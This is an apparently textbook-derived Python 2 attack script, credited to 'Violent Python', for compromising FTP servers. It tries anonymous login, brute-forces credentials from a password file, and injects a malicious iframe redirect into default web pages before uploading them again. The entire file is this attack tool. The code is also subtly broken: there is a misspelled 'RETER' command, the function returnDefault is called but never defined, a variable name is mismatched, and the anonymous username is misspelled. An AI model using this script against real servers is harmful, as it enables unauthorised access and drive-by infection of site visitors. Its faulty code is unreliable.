# Author: Violent Python by Justin Seitz

# Usage: -H <target host[s]> -r <redirect page> -f <userpass file>


import ftplib
import optparse
import time


def anonLogin(hostname):
	try:
		ftp = ftplib.FTP(hostname)
		ftp.login('anonymous', 'me@your.com')
		print '\n[*]' + str(hostname)+\
			' FTP Anonymous Login Succeeded!'
		ftp.quit()
		return True
	except Exception, e:
		print '\n[-] ' + str(hostname) +\
			' FTP Anonymous Login Failed.'
		return False

def bruteLogin(hostname, passwdFile):
    pF = open(passwdFile, 'r')
    for line in pF.readlines():
	time.sleep(1)
        userName = line.split(':')[0]
        passWord = line.split(':')[1].strip('\r').strip('\n')
	print "[+] Trying: "+userName+"/"+passWord
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(userName, passWord)
            print '\n[*] ' + str(hostname) +\
' FTP Logon Succeeded: '+userName+"/"+passWord
            ftp.quit()
            return (userName, passWord)
        except Exception, e:
            pass
    print '\n[-] Could not brute force FTP credentials.'
    return (None, None)


def injectPage(ftp, page, redirect):
	f = open(page + '.tmp', 'w')
	ftp.retrlines('RETER ' + page, f.write)
	print '[+] Downloaded Page: ' + page

	f.write(redirect)
	f.close()
	print '[+] Injected Malicious IFrame on: ' + page
	
	ftp.storlines('STOR ' + page, open(page + '.tmp' ))

def attack (username, password, tgtHost, redirect):

	ftp = ftplib.FTP(tgtHost)
	ftp.login(username, password)
	defPages = returnDefault(ftp)
	for defPage in defPages:
		injectPage(ftp, defpage, redirect)
		
def main():
	parser = optparse.OptionParser('usage % prog -H <target host[s]> -r <redirect page> -f <userpass file>')
	
	parser.add_option('-H', dest ='tgtHosts',\
		type= 'string', help='specify target host')
	parser.add_option('-f', dest='passwdFile',\
		type='string', help='specify user/password file')
	parser.add_option('-r', dest='redirect',\
		type='string', help='specify a redirection page')

	(options, args) = parser.parse_args()
	tgtHosts = str(options.tgtHosts).split(',')
	passwdFile = options.passwdFile
	redirect = options.redirect

	if tgtHosts == None or redirect == None:
		print parser.usage
		exit(0)
	for tgtHost in tgtHosts:
		username = None
		password = None
			
		if anonLogin(tgtHost) == True:
			username = 'annonymous'
			password = 'me@your.com'
			print '[+] Using Anonymous Credentials to attack'
			attack(username, password, tgtHost, redirect)
		
		elif passwdFile != None:
			(username, password) =\
				bruteLogin(tgtHost, passwdFile)
			if password != None:
				'[+] Using Credentials: '+\
					username + '/' + password + ' to attack'
				attack(username, password, tgtHost, redirect)

if __name__ == '__main__':
	main()











